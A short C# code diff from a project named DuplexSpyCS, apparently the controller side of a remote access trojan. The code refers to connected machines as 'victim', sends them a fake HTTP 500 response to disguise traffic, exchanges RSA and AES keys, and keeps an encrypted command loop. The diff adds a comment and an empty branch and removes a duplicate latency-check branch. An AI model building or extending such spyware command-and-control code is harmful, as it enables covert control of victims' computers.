@@ -154,6 +154,7 @@ namespace DuplexSpyCS
                 //Fake response.
                 victim.Send(new clsHttpResp("500 Error", "HTTP 500://Server internal error.").fnGetBytes());
 
+                //Send RSA public key.
                 victim.Send(new clsHttpResp(1, 0, clsCrypto.b64E2Str(szRsaPublicKey)).fnGetBytes());
 
                 while (m_bIslistening)
@@ -190,7 +191,12 @@ namespace DuplexSpyCS
                         }
                         else if (nCmd == 1)
                         {
-                            if (nParam == 1)
+                            if (nParam == 0)
+                            {
+                                
+                                
+                            }
+                            else if (nParam == 1)
                             {
                                 byte[] abEncAesData = Convert.FromBase64String(Encoding.UTF8.GetString(abMsg));
                                 byte[] abPlainData = clsCrypto.RSADecrypt(abEncAesData, victim.key_pairs.private_key);
@@ -242,18 +248,6 @@ namespace DuplexSpyCS
                                 victim.Send(abBuffer);
 
                                 clsStore.sent_bytes += abBuffer.Length;
-                            }
-                            else if (nParam == 1)
-                            {
-                                await Task.Run(() =>
-                                {
-                                    int nDelay = 1000;
-                                    DateTime datetime = DateTime.Now;
-                                    TimeSpan span = datetime - victim.last_sent;
-                                    victim.latency_time = span.Milliseconds;
-                                    victim.last_sent = datetime;
-                                    victim.fnHttpSend(2, 1, clsEZData.fnGenerateRandomStr());
-                                });
                             }
                         }
                     }
